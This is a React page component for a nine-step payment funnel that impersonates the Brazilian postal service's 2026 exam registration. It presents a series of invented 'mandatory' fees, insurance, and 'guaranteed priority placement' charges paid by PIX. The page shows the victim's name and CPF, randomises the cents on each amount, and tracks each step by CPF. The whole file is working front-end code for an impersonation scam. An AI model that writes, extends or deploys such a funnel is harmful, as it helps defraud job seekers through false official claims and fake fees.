import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { BookOpen, FileText, Shield, MapPin, Zap, Receipt, Award, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import CorreiosCard from "@/components/CorreiosCard";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELL_INFO = [
  {
    title: "Material para o Dia da Prova",
    valor: 34,
    tipo: "material" as const,
    icon: BookOpen,
    headline: "Kit Completo para o Dia da Prova",
    description: "Receba todo o material necessário para realizar a prova do Concurso Correios 2026 com tranquilidade.",
    items: [
      "Caderno de questões oficial com 60 questões",
      "Folha de respostas personalizada com seus dados",
      "Caneta esferográfica preta homologada pela banca",
      "Bloco de rascunho carimbado pelo fiscal",
      "Envelope lacrado para documentos pessoais",
    ],
    nota: "O material será entregue no local da prova no dia do exame.",
  },
  {
    title: "Taxa de Processamento Digital",
    valor: 29,
    tipo: "taxa" as const,
    icon: FileText,
    headline: "Processamento Digital da Inscrição",
    description: "Taxa obrigatória para o processamento digital da sua inscrição no sistema integrado dos Correios.",
    items: [
      "Validação dos dados no sistema federal",
      "Geração do número de inscrição definitivo",
      "Vinculação ao banco de dados da banca IBFC",
      "Registro no Diário Oficial Eletrônico",
    ],
    nota: "Processamento realizado em até 24 horas úteis.",
  },
  {
    title: "Seguro de Inscrição",
    valor: 34,
    tipo: "taxa" as const,
    icon: Shield,
    headline: "Seguro Proteção da Inscrição",
    description: "Seguro que garante reembolso integral caso o concurso seja cancelado, adiado ou sua inscrição seja indeferida.",
    items: [
      "Reembolso integral em caso de cancelamento",
      "Cobertura por adiamento superior a 90 dias",
      "Proteção contra indeferimento por erro do sistema",
      "Assistência para recurso administrativo",
    ],
    nota: "Válido até a data de realização da prova.",
  },
  {
    title: "Taxa de Confirmação de Vaga",
    valor: 19,
    tipo: "taxa" as const,
    icon: MapPin,
    headline: "Confirmação e Reserva de Vaga",
    description: "Confirmação da sua vaga e reserva do local de prova mais próximo do seu endereço.",
    items: [
      "Reserva de vaga na data selecionada",
      "Alocação no local de prova mais próximo",
      "Garantia de sala com acessibilidade",
      "Confirmação por e-mail e SMS",
    ],
    nota: "O local será informado 15 dias antes da prova.",
  },
  {
    title: "Kit Preparatório Express",
    valor: 42,
    tipo: "taxa" as const,
    icon: Zap,
    headline: "Kit de Revisão de Última Hora",
    description: "Material de revisão rápida com resumos, mapas mentais e questões comentadas das últimas provas da IBFC.",
    items: [
      "Resumos de todas as matérias do edital",
      "Mapas mentais com tópicos mais cobrados",
      "50 questões comentadas de provas anteriores",
      "Dicas exclusivas de aprovados",
    ],
    nota: "Acesso digital imediato após confirmação.",
  },
  {
    title: "Taxa de Emissão de Comprovante",
    valor: 15,
    tipo: "taxa" as const,
    icon: Receipt,
    headline: "Emissão do Comprovante Oficial",
    description: "Emissão do comprovante oficial de inscrição com código de autenticação e QR Code de validação.",
    items: [
      "Comprovante com código de autenticação único",
      "QR Code para validação no dia da prova",
      "Versão digital e impressa disponíveis",
      "Aceito como documento oficial do concurso",
    ],
    nota: "Comprovante disponível em até 2 horas.",
  },
  {
    title: "Certificado de Inscrição Digital",
    valor: 22,
    tipo: "taxa" as const,
    icon: Award,
    headline: "Certificado Digital de Inscrição",
    description: "Certificado digital de inscrição com assinatura eletrônica, válido como documento oficial do concurso.",
    items: [
      "Assinatura eletrônica ICP-Brasil",
      "Válido como documento oficial",
      "Pode ser usado para abono de falta no trabalho",
      "Registro permanente no sistema dos Correios",
    ],
    nota: "Certificado gerado com validade jurídica.",
  },
  {
    title: "Taxa de Finalização",
    valor: 12,
    tipo: "taxa" as const,
    icon: CheckSquare,
    headline: "Finalização do Processo de Inscrição",
    description: "Taxa final para encerramento e homologação do processo de inscrição no sistema dos Correios.",
    items: [
      "Homologação definitiva da inscrição",
      "Encerramento do protocolo de inscrição",
      "Geração do cartão de confirmação",
      "Inclusão na lista oficial de inscritos",
    ],
    nota: "Após o pagamento, sua inscrição será homologada.",
  },
  {
    title: "Garantia de Vaga Prioritária",
    valor: 89,
    tipo: "taxa" as const,
    icon: Star,
    headline: "Prioridade na Alocação de Vaga",
    description: "IMPORTANTE: Garante prioridade máxima na alocação da sua vaga na agência dos Correios mais próxima da sua residência.",
    items: [
      "Prioridade na escolha da agência de lotação",
      "Preferência na alocação geográfica",
      "Garantia de vaga na região selecionada",
      "Acompanhamento prioritário do processo",
    ],
    nota: "Sujeito à disponibilidade de vagas na região.",
  },
];

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const info = UPSELL_INFO[currentIndex];
  const Icon = info.icon;

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm(`/upsell/${stepNumber}`), {
      state: { cpfData, valorBeneficio, protocolo },
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb={`Concursos > Inscrição > Etapa ${stepNumber}/9`} />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <CorreiosCard className="w-full max-w-lg">
          <div className="space-y-5">
            {/* Header */}
            <div className="text-center space-y-2">
              <div className="w-14 h-14 mx-auto rounded-full bg-primary/10 flex items-center justify-center">
                <Icon className="w-7 h-7 text-primary" />
              </div>
              <h1 className="text-lg sm:text-xl font-bold text-foreground">{info.headline}</h1>
              <p className="text-sm text-muted-foreground">{info.description}</p>
            </div>

            {/* Items */}
            <div className="bg-muted rounded-lg p-4 space-y-3">
              <p className="text-xs font-bold text-foreground uppercase tracking-wide">
                {info.tipo === "material" ? "O que está incluso:" : "O que cobre:"}
              </p>
              <ul className="space-y-2">
                {info.items.map((item, i) => (
                  <li key={i} className="flex items-start gap-2 text-sm text-foreground">
                    <span className="text-primary mt-0.5 shrink-0">✓</span>
                    <span>{item}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Nota */}
            <p className="text-xs text-muted-foreground text-center italic">{info.nota}</p>

            {/* Candidato */}
            <div className="bg-muted rounded-lg p-3 space-y-1">
              <div className="flex justify-between text-sm">
                <span className="text-muted-foreground">Candidato:</span>
                <span className="font-bold text-foreground">{cpfData.nome}</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-muted-foreground">CPF:</span>
                <span className="font-bold text-foreground">{cpfData.cpf}</span>
              </div>
            </div>

            {/* Valor */}
            <div className="bg-accent/20 border border-accent rounded-lg p-4 text-center">
              <p className="text-xs text-muted-foreground font-medium">
                {info.tipo === "material" ? "Valor do Material:" : "Valor da Taxa:"}
              </p>
              <p className="text-3xl font-black text-primary mt-1">
                R$ {valorComCentavos.toFixed(2).replace('.', ',')}
              </p>
            </div>

            {/* Botão */}
            <Button
              onClick={handlePagar}
              className="w-full h-14 text-sm font-black gradient-correios-accent text-[hsl(209,100%,20%)]"
            >
              PAGAR AGORA
            </Button>

            <p className="text-[10px] text-center text-muted-foreground">
              Etapa {stepNumber} de 9 — Pagamento via PIX com confirmação instantânea
            </p>
          </div>
        </CorreiosCard>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
